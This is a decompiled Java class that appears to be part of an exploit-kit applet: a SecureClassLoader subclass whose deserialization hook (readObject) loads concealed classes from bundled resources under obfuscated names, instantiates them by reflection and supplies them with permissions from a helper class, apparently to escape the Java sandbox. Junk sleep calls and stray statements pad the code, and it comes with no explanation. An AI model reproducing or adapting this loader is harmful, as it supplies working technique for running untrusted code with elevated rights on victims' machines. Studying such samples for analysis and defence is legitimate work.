import java.io.InputStream;
import java.security.PermissionCollection;
import java.security.CodeSource;
import java.io.IOException;
import java.lang.reflect.Constructor;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.security.SecureClassLoader;

// 
// Decompiled by Procyon v0.5.30
// 

public class Tuggoaerffb extends SecureClassLoader implements Serializable
{
    private static final long serialVersionUID = -6905751767065574277L;
    
    private void readObject(final ObjectInputStream objectInputStream) throws IOException, ClassNotFoundException {
        final long n = 1000L;
        try {
            final Class autoLoadClass = this.autoLoadClass("g6k1");
            false;
            final String _v = main.__v;
            final int int1 = Integer.parseInt(main.__Y);
            false;
            final Constructor<?> constructor = autoLoadClass.getConstructor(_v.getClass(), Integer.TYPE);
            Thread.sleep(0L);
            Thread.sleep(0L);
            Thread.sleep(0L);
            final Object instance = constructor.newInstance(new String(_v), new Integer(int1));
            Thread.sleep(0L);
            Thread.sleep(0L);
            false;
            Thread.sleep(0L);
            final Class autoLoadClass2 = this.autoLoadClass("q3p0");
            Thread.sleep(0L);
            Thread.sleep(0L);
            false;
            Thread.sleep(0L);
            final Constructor<Object> constructor2 = autoLoadClass2.getConstructor(autoLoadClass);
            Thread.sleep(0L);
            Thread.sleep(0L);
            false;
            Thread.sleep(0L);
            constructor2.newInstance(instance);
            Thread.sleep(0L);
            Thread.sleep(0L);
            Thread.sleep(0L);
            autoLoadClass2.getField(main.coder("y;0=z"));
            Thread.sleep(0L);
            Thread.sleep(0L);
            Thread.sleep(0L);
            false;
        Label_0353_Outer:
            while (true) {
                while (true) {
                    try {
                        while (true) {
                            Thread.sleep(n);
                        }
                    }
                    catch (InterruptedException ex) {
                        false;
                        continue Label_0353_Outer;
                    }
                    continue;
                }
            }
        }
        catch (Exception ex2) {
            objectInputStream.defaultReadObject();
            false;
        }
    }
    
    public PermissionCollection getPermissions(final CodeSource codeSource) {
        return g5z6.__X(codeSource);
    }
    
    @Override
    protected Class findClass(final String s) throws ClassNotFoundException {
        false;
        Class autoLoadClass;
        try {
            autoLoadClass = this.autoLoadClass(s);
        }
        catch (IOException ex) {
            throw new ClassNotFoundException();
        }
        return autoLoadClass;
    }
    
    public Class autoLoadClass(final String s) throws IOException, ClassNotFoundException {
        final String coder = main.coder("k-/.76");
        final InputStream resourceAsStream = main.class.getResourceAsStream(s + coder);
        if (resourceAsStream == null) {
            throw new ClassNotFoundException(s + coder);
        }
        final byte[] bytesFromStream = main.getBytesFromStream(resourceAsStream);
        this.defineClass(s, bytesFromStream, 0, bytesFromStream.length, main.__e());
        return this.loadClass(s, true);
    }
}
